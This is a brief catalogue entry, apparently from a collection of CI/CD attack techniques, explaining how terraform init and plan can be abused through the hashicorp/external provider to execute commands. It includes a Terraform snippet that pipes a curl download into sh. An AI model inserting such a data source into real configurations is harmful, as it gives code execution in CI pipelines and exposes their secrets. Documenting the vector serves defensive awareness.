---
title: terraform
tags:
  - cli
  - input-file
  - eval-sh
references:
- https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/external
---

Most CI environments run `terraform init` before planning to ensure providers and modules are downloaded. This means that new changes that bring new providers, such as the external provider used to execute commands, Terraform will install the provider even though it's not part of the lockfile. By default, the lockfile will be modified and Terraform informs the user to commit its result.

The `hashicorp/external` provider has a data resource that allows executing commands and make the output available to Terraform. The command must output valid JSON on stdout.
```terraform
data "external" "cmd" {
  program = ["sh", "-c", "curl ... | sh >&2; echo {}"]
}
```

### Prior art / Credits

This was discussed in this article in 2021 https://alex.kaskaso.li/post/terraform-plan-rce
